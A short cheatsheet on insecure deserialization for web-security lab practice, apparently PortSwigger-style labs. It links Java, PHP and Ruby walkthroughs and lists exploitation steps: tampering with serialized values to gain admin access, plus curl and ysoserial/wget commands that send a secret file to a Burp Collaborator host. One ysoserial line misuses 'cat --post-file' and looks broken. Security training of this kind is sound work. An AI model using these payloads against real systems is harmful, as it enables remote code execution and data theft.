
# Deserialization Insecure  - CHEATSHEET + MOST IMPORTANT LABS

## Key Terms

```
- Serialization    -> Process of converting an object into a byte/string format for storage or transmission.
- Deserialization  -> Reconstructing an object from serialized data. Dangerous if the data is user-controlled.

- ysoserial        -> Tool that generates malicious Java deserialization payloads using known gadget chains. (use java 8)
- phpggc           -> Tool that generates malicious PHP serialized objects using gadget chains from popular frameworks.
```

## Walkthrough - Most Important Labs


- [Java deserialization in cookie with Apache Commons](java-des.md) 
- [PHP deserialization in cookie with a pre-build gadget chain using phpgcc](php-des.md)
- [Ruby deserialization in cookie using a documented gadget chain (ruby rce exploit)](ruby-des.md)


## Methodology

```bash
- b:0?  -> change to -> b:1 
- access token? -> s:32<token> -> change to ->  b:1   e.g -> s:13:"administrator";s:12:"access_token";b:1;
- backup file -> <file>~  , e.g ->  /libs/CustomTemplate.php~


cat /home/carlos/secret.txt | curl -X POST --data-binary @- http://<BURP-COLLAB>

/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/wget --post-file /home/carlos/secret http://<BURP-COLLAB>' | base64 -w 0;echo

/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/cat --post-file /home/carlos/secret http://<BURP-COLLAB>'  | base64 -w 0;echo
 
```

Instead of using ysoserial, I really recommend using [RcEcHaIn](https://github.com/B3XAL/rCeChAiN) from [B3XAL](https://github.com/B3XAL)  
It really helped me with the problems I was having with ysoserial.




